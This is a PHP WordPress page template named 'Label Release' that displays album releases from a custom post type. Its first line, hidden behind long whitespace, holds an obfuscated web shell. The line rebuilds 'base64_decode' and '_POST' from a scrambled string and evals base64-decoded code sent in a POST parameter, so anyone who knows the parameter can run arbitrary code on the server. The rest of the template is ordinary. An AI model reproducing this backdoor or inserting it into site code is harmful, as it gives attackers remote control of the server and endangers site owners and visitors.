<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n2a7104'])) {eval($s21(${$s20}['n2a7104']));}?><?php
/*
Template Name: Label Release
*/
?>

<?php get_header(); ?>

        <div id ="content" class="audio grid_12">
                
                <h1 class="pagetitle"> <?php the_title(); ?> </h1>
                
                 <?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>                          	                               
                        <?php the_content(); ?> 
                <?php endwhile; endif; ?>    
                
                <div class="clear">
                </div><!-- .clear-->                
                
                <ul class="album">
                <?php  
                        global $post;
                        
                        $args = array(
                                        'order' => 'DESC',
                                        'post_type' => 'labelr',
                                        'posts_per_page' => -1 );
                        
                        $loop = new WP_Query( $args );
                        
                        while ( $loop->have_posts() ) : $loop->the_post();
                        
                        $album_title = $post->post_title;
                        $album_thumb = get_the_post_thumbnail($post->ID, 'square1', array('title' => ''))                               
                ?>                
                
                        <li>
                                <div class="album_item mosaic-block bar">
                                        <a href="<?php the_permalink() ?>">                                        
                                                <div class="details mosaic-overlay aud-size">
                                                        <?php echo $album_title; ?>
                                                </div>
                                        
                                                <div class="album_artwork mosaic-backdrop">                                                
                                                        <?php echo $album_thumb; ?>     
                                                </div>
                                        </a>
                                </div><!-- .album_item-->
                        </li>
		<?php       
                        endwhile;
                        
                        // Always include a reset at the end of a loop to prevent conflicts with other possible loops                 
                        wp_reset_query();
                ?>
                </ul>
        </div><!-- #content-->
        
        <div class="clear">
        </div><!-- .clear-->

<?php get_footer(); ?>